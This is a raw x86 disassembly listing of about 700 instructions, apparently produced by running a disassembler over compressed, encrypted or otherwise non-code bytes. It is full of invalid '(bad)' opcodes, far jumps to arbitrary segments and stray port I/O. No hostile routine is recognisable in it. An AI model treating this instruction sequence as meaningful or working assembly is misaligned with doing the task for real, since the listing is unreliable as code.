  418dd8:	push   ebp
  418dd9:	sahf   
  418dda:	mov    eax,ds:0xf6bc7cc7
  418ddf:	shl    ah,1
  418de1:	test   al,0xab
  418de3:	repz test ebp,ebx
  418de6:	call   0xb5d2:0xd92fa657
  418ded:	mov    ecx,0x1ae32c04
  418df2:	add    eax,0xa5abcf29
  418df7:	sbb    DWORD PTR [eax+0x7308d4f9],0x2d
  418dfe:	mov    ecx,0xee50eae2
  418e03:	in     eax,dx
  418e04:	test   BYTE PTR [ecx-0x2a18f3ae],ah
  418e0a:	outs   dx,DWORD PTR ds:[esi]
  418e0b:	cmp    DWORD PTR [edi+0x30],esi
  418e0e:	shr    DWORD PTR [eax],cl
  418e10:	fstp   QWORD PTR [edi-0x5d]
  418e13:	or     bl,cl
  418e15:	push   0x73
  418e17:	icebp  
  418e18:	mov    ds:0x81c8d6d6,al
  418e1d:	jnp    0x418dfd
  418e1f:	out    dx,al
  418e20:	add    ah,0x42
  418e23:	inc    edi
  418e24:	xchg   edi,eax
  418e25:	mov    ecx,edi
  418e27:	repnz shr BYTE PTR [edi-0x1a64aa07],cl
  418e2e:	imul   edx,esi,0x35243a12
  418e34:	dec    ebp
  418e35:	(bad)  
  418e36:	shl    al,1
  418e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e39:	add    al,0x5e
  418e3b:	jo     0x782b9060
  418e41:	adc    al,0x29
  418e43:	out    0x22,eax
  418e45:	ins    BYTE PTR es:[edi],dx
  418e46:	inc    ecx
  418e47:	jl     0x418df0
  418e49:	daa    
  418e4a:	cmp    eax,0xcc8257a2
  418e4f:	mov    edi,0x81b9caad
  418e54:	or     esp,DWORD PTR [esp+eiz*4-0x2de50b7a]
  418e5b:	or     al,0xe2
  418e5d:	push   edi
  418e5e:	aas    
  418e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e60:	jb     0x418e88
  418e62:	adc    WORD PTR [ecx-0x1abcd229],ax
  418e69:	pushf  
  418e6a:	fdivr  st,st(5)
  418e6c:	loope  0x418e9e
  418e6e:	pop    esi
  418e6f:	xchg   edx,eax
  418e70:	push   ss
  418e71:	inc    esi
  418e72:	fbstp  TBYTE PTR [ecx+0x9]
  418e75:	stos   BYTE PTR es:[edi],al
  418e76:	sbb    eax,0x76ca3b34
  418e7b:	cmp    DWORD PTR [ebx],0x9712a38a
  418e81:	int3   
  418e82:	div    ebp
  418e84:	not    BYTE PTR [eax]
  418e86:	pop    ss
  418e87:	or     eax,0x5a8cdf52
  418e8c:	mov    esp,0x7411450c
  418e91:	pop    es
  418e92:	jbe    0x418e2d
  418e94:	pop    ds
  418e95:	push   edi
  418e96:	xchg   esi,eax
  418e97:	cld    
  418e98:	iret   
  418e99:	enter  0x156d,0xd7
  418e9d:	in     al,dx
  418e9e:	cld    
  418e9f:	cmp    al,0x3d
  418ea1:	pusha  
  418ea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ea4:	repnz adc BYTE PTR [edx-0x18],cl
  418ea8:	fwait
  418ea9:	and    eax,0x27980f3d
  418eae:	ins    DWORD PTR es:[edi],dx
  418eaf:	cmc    
  418eb0:	fidivr WORD PTR [edx+esi*8]
  418eb3:	psllw  mm0,QWORD PTR [edx+0x56]
  418eb7:	stc    
  418eb8:	cld    
  418eb9:	(bad)  
  418ebb:	ret    0x8c01
  418ebe:	jbe    0x418eb7
  418ec0:	(bad)  
  418ec1:	sub    al,BYTE PTR [eax+ebx*8]
  418ec4:	cld    
  418ec5:	or     ah,bl
  418ec7:	not    BYTE PTR [ecx+0x36]
  418eca:	push   ecx
  418ecb:	pop    edi
  418ecc:	jl     0x418f3a
  418ece:	icebp  
  418ecf:	outs   dx,BYTE PTR ds:[esi]
  418ed0:	(bad)  
  418ed1:	out    dx,al
  418ed2:	push   0x5c201ee4
  418ed7:	sbb    edi,DWORD PTR [edi-0x7b482335]
  418edd:	mov    edi,0x706e38e5
  418ee2:	cmp    ah,ah
  418ee4:	or     BYTE PTR [ebp-0x488c2606],cl
  418eea:	stos   DWORD PTR es:[edi],eax
  418eeb:	add    DWORD PTR [esp+ebp*2-0x3ea266a6],ebx
  418ef2:	mov    eax,0x3db45425
  418ef7:	dec    esi
  418ef8:	adc    eax,0x7023c997
  418efd:	sbb    ch,bh
  418eff:	mov    ebx,eax
  418f01:	fnstcw WORD PTR [ebx+0x1d43d3be]
  418f07:	inc    edi
  418f08:	push   ebp
  418f09:	cmp    al,0xfb
  418f0b:	mov    eax,ds:0xf5352840
  418f10:	les    edi,FWORD PTR ds:[ebp+0x75]
  418f14:	int    0x9d
  418f16:	popa   
  418f17:	xchg   ebx,eax
  418f18:	hlt    
  418f19:	popa   
  418f1a:	outs   dx,DWORD PTR ds:[esi]
  418f1b:	in     eax,dx
  418f1c:	test   BYTE PTR [edx+0x4308474f],0xe8
  418f23:	pop    ss
  418f24:	jb     0x418f71
  418f26:	xchg   edi,eax
  418f27:	sti    
  418f28:	sub    dl,BYTE PTR [edx]
  418f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f2b:	arpl   WORD PTR [edi+0x14],si
  418f2e:	push   es
  418f2f:	pusha  
  418f30:	shl    BYTE PTR [edi-0x45],0xc6
  418f34:	adc    al,0xa5
  418f36:	cld    
  418f37:	xchg   ebx,eax
  418f38:	ds inc esi
  418f3a:	gs dec edx
  418f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f3d:	jae    0x418f4e
  418f3f:	pop    edx
  418f40:	rcr    BYTE PTR [edx+0x6b],cl
  418f43:	and    al,0x38
  418f45:	mov    BYTE PTR [edx+ebp*8+0x57],al
  418f49:	aad    0xd1
  418f4b:	jmp    0x10ea:0x9418f43
  418f52:	mov    WORD PTR ds:0xd313a192,fs
  418f58:	les    eax,FWORD PTR [edi]
  418f5a:	mov    BYTE PTR [esi+0x5af714ba],ch
  418f60:	out    0x6b,al
  418f62:	jne    0x418f18
  418f64:	xor    eax,0xfffffffc
  418f67:	sbb    dl,BYTE PTR [edx+0x7e4e12c2]
  418f6d:	fisub  WORD PTR [ecx-0x10a971de]
  418f73:	test   esi,eax
  418f75:	adc    DWORD PTR [edi+0xef80a5f],esp
  418f7b:	mov    bh,0xfa
  418f7d:	fiadd  WORD PTR [ebx-0x4e09547b]
  418f83:	rcr    dl,1
  418f85:	add    eax,0x3fe1427d
  418f8a:	data16 mov dh,0xc4
  418f8d:	stos   DWORD PTR es:[edi],eax
  418f8e:	loopne 0x418f8a
  418f90:	(bad)  
  418f91:	sti    
  418f92:	mov    al,0xe9
  418f94:	dec    edi
  418f95:	jmp    0x418f8e
  418f97:	shr    bh,cl
  418f99:	das    
  418f9a:	adc    DWORD PTR [ebx+0x72],esp
  418f9d:	mov    edx,DWORD PTR [ecx]
  418f9f:	push   0x947e9a05
  418fa4:	ds push cs
  418fa6:	fnstsw WORD PTR [esi]
  418fa8:	out    dx,al
  418fa9:	in     al,0x73
  418fab:	push   eax
  418fac:	dec    edi
  418fad:	mov    eax,ds:0xbfcfa1b0
  418fb2:	sub    BYTE PTR [ecx],cl
  418fb4:	outs   dx,DWORD PTR ds:[esi]
  418fb5:	jo     0x418fd9
  418fb7:	(bad)  
  418fb8:	dec    edi
  418fb9:	push   ebx
  418fba:	lea    ebx,[ecx+0x25]
  418fbd:	add    DWORD PTR [eax-0x2f3650fc],edx
  418fc3:	mov    ds,WORD PTR [edx-0x27a07122]
  418fc9:	dec    eax
  418fca:	popf   
  418fcb:	ja     0x418fbc
  418fcd:	jne    0x418f5f
  418fcf:	mov    cl,0x2d
  418fd1:	hlt    
  418fd2:	scas   eax,DWORD PTR es:[edi]
  418fd3:	and    ecx,DWORD PTR [edi-0x5bbc9460]
  418fd9:	push   edx
  418fda:	or     al,0x93
  418fdc:	jmp    0x419028
  418fde:	xchg   esp,eax
  418fdf:	in     eax,dx
  418fe0:	push   cs
  418fe1:	loope  0x41903f
  418fe3:	test   eax,0xa510963a
  418fe8:	jbe    0x41901b
  418fea:	ret    
  418feb:	in     eax,0x7d
  418fed:	les    eax,FWORD PTR [ecx+0x65]
  418ff0:	popf   
  418ff1:	pop    edx
  418ff2:	mov    ds:0xfebd0426,eax
  418ff7:	iret   
  418ff8:	inc    ebx
  418ff9:	dec    eax
  418ffa:	aad    0x76
  418ffc:	test   DWORD PTR [edi],ebx
  418ffe:	data16 sub BYTE PTR [esi],bl
  419001:	mov    al,0x2f
  419003:	ja     0x419001
  419005:	jo     0x41905b
  419007:	cmp    BYTE PTR ds:0xf6e1f186,bh
  41900d:	adc    DWORD PTR [esi],0x8efbf85
  419013:	pop    ebx
  419014:	jle    0x418ff9
  419016:	mov    ds:0xa7f37563,al
  41901b:	scas   eax,DWORD PTR es:[edi]
  41901c:	xor    DWORD PTR [esi],ebp
  41901e:	shr    DWORD PTR [edi+0x4c],0xb8
  419022:	imul   edx,DWORD PTR [esi],0x8632a5fc
  419028:	or     al,0x2b
  41902a:	jle    0x418fee
  41902c:	sbb    dl,cl
  41902e:	cmp    esi,esi
  419030:	cli    
  419031:	add    eax,DWORD PTR [eax+0x557ea5cc]
  419037:	sbb    eax,0xf392ee64
  41903c:	adc    BYTE PTR [esi],dl
  41903e:	idiv   sp
  419041:	xlat   BYTE PTR ds:[ebx]
  419042:	push   edx
  419043:	shl    DWORD PTR [eax+0x11],1
  419046:	or     al,BYTE PTR [esi]
  419048:	cmp    cl,dh
  41904a:	retf   
  41904b:	mov    BYTE PTR [ecx+0x575136b9],0xba
  419052:	cmp    BYTE PTR [ebx],0x30
  419055:	or     DWORD PTR cs:[esp+edx*8],esp
  419059:	popf   
  41905a:	cmp    al,0xc4
  41905c:	fstp   st(5)
  41905e:	outs   dx,DWORD PTR ds:[esi]
  41905f:	ret    
  419060:	xchg   ecx,eax
  419061:	sar    DWORD PTR [ebp-0x61],0x43
  419065:	pushf  
  419066:	retf   0x7c83
  419069:	repnz lods eax,DWORD PTR ds:[esi]
  41906b:	hlt    
  41906c:	mov    al,0x9b
  41906e:	mov    gs:0x2ccca091,eax
  419074:	sub    esi,DWORD PTR [edi+0x386bad28]
  41907a:	loope  0x419094
  41907c:	in     al,0x4b
  41907e:	sub    eax,0x535a1596
  419083:	pop    ebp
  419084:	das    
  419085:	or     al,0xeb
  419087:	imul   ebx,ebp,0x1d9b80de
  41908d:	jle    0x419049
  41908f:	je     0x4190c8
  419091:	in     eax,0x9
  419093:	nop
  419094:	mov    bl,0x73
  419096:	fst    QWORD PTR [ebx-0x7253d54b]
  41909c:	adc    esi,ebx
  41909e:	and    BYTE PTR [eax+0xb4d0662],cl
  4190a4:	pop    esi
  4190a5:	and    BYTE PTR [eax],bl
  4190a7:	shl    BYTE PTR [edi+0x1a],0x43
  4190ab:	je     0x419093
  4190ad:	shr    BYTE PTR [eax-0x5a23211b],cl
  4190b3:	cmp    edx,esp
  4190b5:	jno    0x4190b0
  4190b7:	scas   al,BYTE PTR es:[edi]
  4190b8:	add    DWORD PTR [edi-0x248fd330],edx
  4190be:	mov    DWORD PTR [ebp-0x9],eax
  4190c1:	jmp    0x419106
  4190c3:	jne    0x419114
  4190c5:	jno    0x4190d8
  4190c7:	fmul   QWORD PTR [ebp+0x4a71c9d8]
  4190cd:	push   ds
  4190ce:	or     DWORD PTR ds:0xd45798dd,esp
  4190d4:	xchg   edi,eax
  4190d5:	pop    ds
  4190d6:	gs popf 
  4190d8:	and    DWORD PTR [eax-0x78],edi
  4190db:	popa   
  4190dc:	cwde   
  4190dd:	inc    eax
  4190de:	jb     0x41909e
  4190e0:	pop    esp
  4190e1:	push   ebp
  4190e2:	sbb    edx,DWORD PTR [edi+ebp*4-0x4f]
  4190e6:	or     ch,BYTE PTR [ebp+0x26]
  4190e9:	in     eax,0xdf
  4190eb:	jmp    0x2e21:0xf23a287e
  4190f2:	in     eax,dx
  4190f3:	pushf  
  4190f4:	push   edx
  4190f5:	dec    ebp
  4190f6:	adc    al,0xe5
  4190f8:	cld    
  4190f9:	and    cl,BYTE PTR [ebp-0x40]
  4190fc:	jnp    0x419097
  4190fe:	and    BYTE PTR [edi],dl
  419100:	leave  
  419101:	dec    ebp
  419102:	loope  0x4190a8
  419104:	jno    0x4190e4
  419106:	sub    BYTE PTR [ecx-0x4],bh
  419109:	popa   
  41910a:	jg     0x419134
  41910c:	into   
  41910d:	pop    ebp
  41910e:	fiadd  DWORD PTR [ebp-0x26]
  419111:	jae    0x419170
  419113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419114:	cmp    BYTE PTR [eax],0xe7
  419117:	push   esi
  419118:	sbb    al,0x28
  41911a:	mov    eax,ds:0xb00a7b33
  41911f:	pop    ds
  419120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419121:	add    al,0xc5
  419123:	inc    edx
  419124:	mov    eax,ds:0x3a732fd
  419129:	jb     0x41918e
  41912b:	jb     0x419172
  41912d:	retf   
  41912e:	fwait
  41912f:	cmp    BYTE PTR [edx],bh
  419131:	in     eax,0xa8
  419133:	cmp    cl,cl
  419135:	jns    0x4190e6
  419137:	pop    ebp
  419138:	push   cs
  419139:	jne    0x4190e5
  41913b:	mov    ecx,0x3b013c26
  419140:	fist   DWORD PTR ds:0x754b66a9
  419146:	jo     0x4191b4
  419148:	test   eax,0xb2b67c3c
  41914d:	and    ebx,ecx
  41914f:	call   0xd0b0:0x88f23ee1
  419156:	jle    0x4190e4
  419158:	dec    eax
  41915a:	clc    
  41915b:	cmp    edx,DWORD PTR [ebx+edx*4]
  41915e:	(bad)  
  41915f:	out    0xea,al
  419161:	dec    esp
  419162:	test   eax,0xc3e59490
  419167:	sbb    ecx,DWORD PTR [edx-0x6f]
  41916a:	pop    esi
  41916b:	mov    bl,0x38
  41916d:	cli    
  41916e:	mov    edx,0xa24c35ce
  419173:	out    dx,eax
  419174:	inc    ecx
  419175:	mov    ch,0x4e
  419177:	jno    0x41911f
  419179:	out    dx,al
  41917a:	adc    BYTE PTR [ebx+0x6368d4b5],cl
  419180:	sbb    ch,BYTE PTR [edx-0x52]
  419183:	mov    edi,0xa4695090
  419188:	jecxz  0x4191eb
  41918a:	xchg   edi,eax
  41918b:	in     al,dx
  41918c:	pop    ebx
  41918d:	aad    0x39
  41918f:	mov    ch,ah
  419191:	push   ds
  419192:	xor    DWORD PTR [ecx+0x4bc077e],0x529cb87e
  41919c:	sub    DWORD PTR [edx+0x55],eax
  41919f:	mov    al,ds:0xdc90ffc
  4191a4:	cwde   
  4191a5:	aam    0xb1
  4191a7:	cld    
  4191a8:	dec    edi
  4191a9:	add    al,0xbc
  4191ab:	mov    ch,0xd9
  4191ad:	add    esp,DWORD PTR [esi]
  4191af:	sbb    eax,0x158a7cac
  4191b4:	repnz pop ebx
  4191b6:	js     0x4191ec
  4191b8:	fstp   QWORD PTR [esi+0x4f]
  4191bb:	stos   DWORD PTR es:[edi],eax
  4191bc:	and    dh,BYTE PTR [ebx]
  4191be:	pop    esp
  4191bf:	mov    esp,0xa401faa5
  4191c4:	cdq    
  4191c5:	rol    DWORD PTR [esi+0x17ae59a2],cl
  4191cb:	dec    esp
  4191cc:	out    0x39,eax
  4191ce:	fnstcw WORD PTR [esi+0x6d8bbf7e]
  4191d4:	mov    al,ds:0x7ccc8229
  4191d9:	push   ebp
  4191da:	aas    
  4191db:	adc    al,0xdc
  4191dd:	adc    ebp,DWORD PTR [ebp-0x5c]
  4191e0:	and    BYTE PTR [edx-0x26],cl
  4191e3:	ss retf 0xafd5
  4191e7:	jle    0x4191dd
  4191e9:	fmul   st,st(4)
  4191eb:	btc    DWORD PTR [ebx-0x28e951c5],ecx
  4191f2:	pop    ebp
  4191f3:	xchg   edi,eax
  4191f4:	cmp    bl,dl
  4191f6:	and    al,0xd2
  4191f8:	es dec cx
  4191fb:	mov    dh,0x5a
  4191fd:	bound  edx,QWORD PTR [ebp-0x1836ab18]
  419203:	cli    
  419204:	adc    ebx,DWORD PTR [eax+0x1e1e75f5]
  41920a:	inc    esp
  41920b:	ins    BYTE PTR es:[edi],dx
  41920c:	call   FWORD PTR [edi]
  41920e:	xor    edx,DWORD PTR [ebp+0x7c118448]
  419214:	call   0xf1721d24
  419219:	jns    0x419249
  41921b:	jmp    FWORD PTR [ebx-0x22]
  41921e:	mov    bh,0x2d
  419220:	pop    ds
  419221:	xchg   esp,eax
  419222:	fwait
  419223:	push   ebx
  419224:	loop   0x4191e7
  419226:	mov    al,0x37
  419228:	jecxz  0x4191f2
  41922a:	adc    al,0x5b
  41922c:	pop    ds
  41922d:	loope  0x419255
  41922f:	sub    al,0x31
  419231:	std    
  419232:	lea    eax,[edx-0x37bb1665]
  419238:	(bad)
  41923b:	in     al,0x65
  41923d:	pusha  
  41923e:	sub    dh,BYTE PTR [ecx-0x67b28247]
  419244:	cmp    dl,BYTE PTR [edx+ecx*1-0x3c]
  419248:	out    dx,al
  419249:	push   edx
  41924a:	mov    eax,0x78da0c6f
  41924f:	ds je  0x4191f5
  419252:	std    
  419253:	mov    ds:0xf41c518f,eax
  419258:	call   0x3c79:0x79840e83
  41925f:	inc    ebx
  419260:	mov    al,BYTE PTR [esp+eiz*4+0x700931ac]
  419267:	lods   eax,DWORD PTR ds:[esi]
  419268:	stc    
  419269:	add    cl,BYTE PTR [ecx+ebx*2-0x3b]
  41926d:	adc    BYTE PTR [esi+0x13db1ac3],al
  419273:	sbb    DWORD PTR [edx+0x26],esp
  419276:	or     al,0xc2
  419278:	jne    0x4192e4
  41927a:	lea    edx,[bp+si]
  41927d:	jle    0x4192f1
  41927f:	push   esi
  419280:	jae    0x4192f9
  419282:	inc    eax
  419283:	out    0x97,eax
  419285:	daa    
  419286:	xor    DWORD PTR [esi],edi
  419288:	addr16 dec eax
  41928a:	fldenv [esi-0x74f4c803]
  419290:	pop    ecx
  419291:	out    dx,eax
  419292:	dec    edi
  419293:	mov    dl,0x92
  419295:	shl    ah,0x2b
  419298:	mov    eax,ds:0x42754c95
  41929d:	pushw  cs
  41929f:	jge    0x4192eb
  4192a1:	aaa    
  4192a2:	addr16 icebp 
  4192a4:	mov    eax,ds:0x76fbeb4
  4192a9:	xchg   esp,eax
  4192aa:	icebp  
  4192ab:	loop   0x4192e8
  4192ad:	xchg   esp,eax
  4192ae:	dec    esp
  4192af:	nop
  4192b0:	fnsave [edi-0x303a97f6]
  4192b6:	cmp    DWORD PTR [edi+0x2f55d242],esi
  4192bc:	inc    ebx
  4192bd:	mov    eax,0x700e877f
  4192c2:	push   edi
  4192c3:	mov    edi,0x1b12b026
  4192c8:	adc    al,0x38
  4192ca:	pop    es
  4192cb:	mov    bh,0xd2
  4192cd:	mov    ch,BYTE PTR [eax]
  4192cf:	jb     0x4192b8
  4192d1:	popa   
  4192d2:	imul   edx,DWORD PTR [eax-0x1b],0x4a9d2cce
  4192d9:	ja     0x419351
  4192db:	xor    DWORD PTR [ebp-0x30],edx
  4192de:	mov    bl,0xf6
  4192e0:	mov    edi,DWORD PTR [eax-0x21]
  4192e3:	push   ebp
  4192e4:	in     eax,0x35
  4192e6:	sub    ch,BYTE PTR ds:0x51c1c093
  4192ec:	or     al,BYTE PTR [ebx-0x3a]
  4192ef:	je     0x419300
  4192f1:	and    eax,0x63047efc
  4192f6:	pop    edx
  4192f7:	push   eax
  4192f8:	sbb    al,0xea
  4192fa:	stos   DWORD PTR es:[edi],eax
  4192fb:	pop    edi
  4192fc:	adc    DWORD PTR [eax+0x3e],eax
  4192ff:	pushf  
  419300:	dec    edx
  419301:	cmp    al,0xf7
  419303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419304:	lock pop ebx
  419306:	sub    ch,dl
  419308:	xor    DWORD PTR [ebx-0x29],esi
  41930b:	test   DWORD PTR [ecx-0x12],ebp
  41930e:	(bad)  
  41930f:	ficom  DWORD PTR [ecx+0x67ddf34e]
  419315:	loop   0x419377
  419317:	mov    ch,0x9c
  419319:	rcl    DWORD PTR [ebx-0x76d9aef0],0x74
  419320:	sbb    eax,0xf4f5a6e8
  419325:	arpl   ax,cx
  419327:	fwait
  419328:	cmp    al,0x3e
  41932a:	push   0xcaebc236
  41932f:	ss sbb eax,0xcb001b2d
  419335:	(bad)  
  419336:	stc    
  419337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419338:	imul   ecx,ecx,0x2dab8eb5
  41933e:	mov    dh,0xe
  419340:	leave  
  419341:	jns    0x419312
  419343:	fninit 
  419345:	or     al,0x6b
  419347:	cmp    al,0xb7
  419349:	push   ss
  41934a:	lahf   
  41934b:	jmp    0x29be:0x28b6e442
  419352:	lds    esi,FWORD PTR [ebp+0x394b2509]
  419358:	enter  0x80db,0x5f
  41935c:	dec    ecx
  41935d:	xchg   edi,eax
  41935e:	daa    
  41935f:	push   ebx
  419360:	outs   dx,DWORD PTR ds:[esi]
  419361:	fld    TBYTE PTR [edi-0x489744d2]
  419367:	inc    esi
  419368:	pop    edx
  419369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936a:	fwait
  41936b:	lock sahf 
  41936d:	add    ebx,DWORD PTR [esi]
  41936f:	cmp    eax,0x26cf2a27
  419374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419375:	test   al,0xb5
  419377:	jmp    0xbbf0:0xc1040169
  41937e:	cli    
  41937f:	clc    
  419380:	icebp  
  419381:	or     ebp,ebx
  419383:	lock outs dx,DWORD PTR ds:[esi]
  419385:	jno    0x41939f
  419387:	into   
  419388:	and    ch,BYTE PTR [edx]
  41938a:	jmp    0x538ee418
  41938f:	pop    ss
  419390:	dec    ebp
  419391:	jl     0x4193eb
  419393:	mov    al,0xa0
  419395:	mov    edi,0xba36ef2e
  41939a:	inc    esp
  41939b:	xor    DWORD PTR [edi],esi
  41939d:	push   ebx
  41939e:	inc    edx
  41939f:	jbe    0x419329
  4193a1:	sbb    BYTE PTR [ecx+ecx*8+0x63d0b9af],bh
  4193a8:	push   ds
  4193a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193aa:	fcom   DWORD PTR gs:[eax+0x3d02abb5]
  4193b1:	dec    ebp
  4193b2:	pop    ds
  4193b3:	(bad)  
  4193b4:	mov    ebx,0x53c6b0bc
  4193b9:	cld    
  4193ba:	popa   
  4193bb:	add    ebx,ebx
  4193bd:	or     eax,DWORD PTR [edi]
  4193bf:	and    eax,0xd3e28f0c
  4193c4:	pop    eax
  4193c5:	fdiv   DWORD PTR [ecx+0x75]
  4193c8:	xchg   ebx,eax
  4193c9:	mov    ds:0xa63974d7,al
  4193ce:	daa    
  4193cf:	jne    0x419446
  4193d1:	lods   eax,DWORD PTR ds:[esi]
  4193d2:	outs   dx,DWORD PTR ds:[esi]
  4193d3:	adc    al,0xea
  4193d5:	dec    eax
  4193d6:	or     DWORD PTR [ecx+0x30],esp
  4193d9:	pop    ds
  4193da:	mov    BYTE PTR [ebp-0x51610a4a],bh
  4193e0:	mov    eax,0xd1a757b9
  4193e5:	jae    0x419436
  4193e7:	cmp    DWORD PTR [edi+0x7e4bffd2],ebx
  4193ed:	lea    ecx,[ecx-0x94fc7aa]
  4193f3:	mov    ch,0x2d
  4193f5:	aas    
  4193f6:	cdq    
  4193f7:	and    esi,eax
  4193f9:	ins    BYTE PTR es:[edi],dx
  4193fa:	xlat   BYTE PTR ds:[ebx]
  4193fb:	(bad)  [edx+0xc]
  4193fe:	pop    ebx
  4193ff:	stos   DWORD PTR es:[edi],eax
  419400:	xlat   BYTE PTR ds:[ebx]
  419401:	out    dx,eax
  419402:	xchg   bl,dh
  419404:	cmp    ch,BYTE PTR [ebp-0x28ddad88]
  41940a:	inc    eax
  41940b:	mov    ch,0x35
  41940d:	(bad)  
  41940e:	(bad)  
  41940f:	rcr    esp,0xdb
  419412:	pop    ds
  419413:	mov    BYTE PTR ds:[edi+0x7dd08eca],0xb5
  41941b:	jnp    0x41944d
  41941d:	in     al,dx
  41941e:	hlt    
  41941f:	out    dx,al
  419420:	loopne 0x41943c
  419422:	sub    al,0x27
  419424:	inc    eax
  419425:	push   edi
  419426:	sti    
  419427:	into   
  419428:	push   cs
  419429:	push   es
  41942a:	jg     0x419417
  41942c:	pop    ds
  41942d:	add    BYTE PTR [edi+edi*4+0x5a],cl
  419431:	(bad)  [esi-0xbb96d70]
  419437:	push   edx
  419438:	ss jns 0x419447
  41943b:	cdq    
  41943c:	fmul   QWORD PTR [edi+0x5a692adf]
  419442:	mov    dh,BYTE PTR [ebx+0x3fced6]
  419448:	js     0x4193f8
  41944a:	jmp    0x41949e
  41944c:	mov    bh,0xd5
  41944e:	and    al,0x73
  419450:	ss das 
  419452:	pop    ebx
  419453:	jae    0x419496
  419455:	pop    edi
  419456:	popa   
  419457:	cmp    DWORD PTR [esi-0x34],edi
  41945a:	cmc    
  41945b:	in     eax,0xde
  41945d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41945e:	lods   al,BYTE PTR ds:[esi]
  41945f:	out    0xe3,eax
  419461:	cmp    al,0x94
  419463:	shr    DWORD PTR [esi],cl
  419465:	and    al,0x1
  419467:	clc    
  419468:	add    DWORD PTR [edi+0x66],edi
  41946b:	iret   
  41946c:	cmp    ecx,ecx
  41946e:	aad    0x1a
  419470:	ds sub bh,bh
  419473:	arpl   WORD PTR [edx-0xb8ac937],bp
  419479:	jb     0x41944a
  41947b:	xchg   edx,eax
  41947c:	aaa    
  41947d:	das    
  41947e:	out    0x23,al
  419480:	iret   
  419481:	sti    
  419482:	fs and eax,0x6f8ac9b
  419488:	cwde   
  419489:	jbe    0x419415
  41948b:	test   al,0x18
  41948d:	dec    eax
  41948e:	(bad)  
  41948f:	jno    0x41943c
  419491:	and    DWORD PTR [esi-0x6787db42],ebx
  419497:	xor    al,0x27
  419499:	retf   
  41949a:	test   BYTE PTR [ebp+0x6e],al
  41949d:	loop   0x41945a
  41949f:	cmp    eax,0xcdc76a97
  4194a4:	les    ebp,FWORD PTR [edx+0x50]
  4194a7:	sbb    ah,cl
  4194a9:	cmc    
  4194aa:	add    DWORD PTR [ecx-0x2a],ebp
  4194ad:	icebp  
  4194ae:	pop    ecx
  4194af:	push   ds
  4194b0:	add    dl,BYTE PTR [ebx-0x4c718366]
  4194b6:	ds (bad) 
  4194b8:	stos   BYTE PTR es:[edi],al
  4194b9:	popf   
  4194ba:	push   ds
  4194bb:	lock lods al,BYTE PTR ds:[esi]
  4194bd:	(bad)  
  4194be:	pusha  
  4194bf:	lods   eax,DWORD PTR ds:[esi]
  4194c0:	sar    edx,cl
  4194c2:	fcmovne st,st(4)
  4194c4:	cld    
  4194c5:	rol    DWORD PTR [edx],cl
  4194c7:	xor    edi,DWORD PTR [ebx+0x6c]
  4194ca:	jl     0x419538
  4194cc:	push   edx
  4194cd:	jle    0x41946b
  4194cf:	and    eax,0x76b056bb
  4194d4:	ja     0x419528
  4194d6:	pop    ss
  4194d7:	test   BYTE PTR [ebx-0x77d2741d],ch
  4194dd:	data16 mov bh,0xf7
  4194e0:	mov    ebx,0xe88ae136
  4194e5:	mov    bl,0x1a
  4194e7:	mov    ecx,0xfa2b0b7a
  4194ec:	aad    0xd2
  4194ee:	jmp    0x419555
  4194f0:	(bad)  [eax-0x7]
  4194f3:	neg    DWORD PTR [ecx]
  4194f5:	xchg   edi,eax
  4194f6:	xchg   DWORD PTR [ecx+eax*1],ebp
  4194f9:	es xor al,0x56
  4194fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194fd:	dec    eax
  4194fe:	adc    dh,BYTE PTR ds:0x6aad6c5b
  419504:	adc    BYTE PTR ds:0x9a6aa9c,bh
  41950a:	mov    edx,0xcc3cbe51
  41950f:	jp     0x419553
  419511:	push   eax
  419512:	or     edi,DWORD PTR [edx]
  419514:	out    dx,al
  419515:	or     BYTE PTR [ebx],dh
  419517:	cld    
  419518:	xchg   ebx,eax
  419519:	cli    
  41951a:	lods   eax,DWORD PTR ds:[esi]
  41951b:	sub    al,0x88
  41951d:	fstp   DWORD PTR [edx-0x35]
  419520:	cmp    BYTE PTR [esi-0x8578b88],al
  419526:	(bad)
  419529:	repnz and edx,DWORD PTR [esi]
  41952c:	call   0xbd9bc856
  419531:	dec    DWORD PTR ds:0x6dae1c82
  419537:	in     al,0xe8
  419539:	mov    al,0xb8
  41953b:	call   0xcfd0:0xd8a68496
  419542:	mov    DWORD PTR [ebp-0x1458777c],edi
  419548:	outs   dx,DWORD PTR ds:[esi]
  419549:	out    0x59,al
  41954b:	adc    BYTE PTR [ebx-0x7c7c2a42],0xf7
  419552:	or     ch,BYTE PTR [eax+esi*2+0x35be5e7f]
  419559:	aam    0x57
  41955b:	sbb    al,0x25
  41955d:	jns    0x4195c8
  41955f:	cmp    dh,BYTE PTR [ebp+edx*8+0x3]
  419563:	(bad)  
  419564:	adc    dh,bl
  419566:	pop    edx
  419567:	test   al,0xcc
  419569:	jo     0x41951b
  41956b:	retf   
  41956c:	ds or  dl,0xb6
  419570:	push   ebp
  419571:	sub    al,0x23
  419573:	jo     0x419545
  419575:	pop    es
  419576:	ins    BYTE PTR es:[edi],dx
  419577:	xor    BYTE PTR [edi],cl
  419579:	sar    DWORD PTR [edx+eiz*1+0x28],1
  41957d:	jne    0x4195ae
  41957f:	push   cs
  419580:	sub    eax,0x6ea2499b
  419585:	adc    esp,DWORD PTR [eax-0x5e]
  419588:	pop    ds
  419589:	xchg   ebp,eax
  41958a:	add    al,0xf6
  41958c:	loope  0x4195e0
  41958e:	outs   dx,BYTE PTR ds:[esi]
  41958f:	ins    DWORD PTR es:[edi],dx
  419590:	bound  esp,QWORD PTR [esi+0x52]
  419593:	adc    dl,al
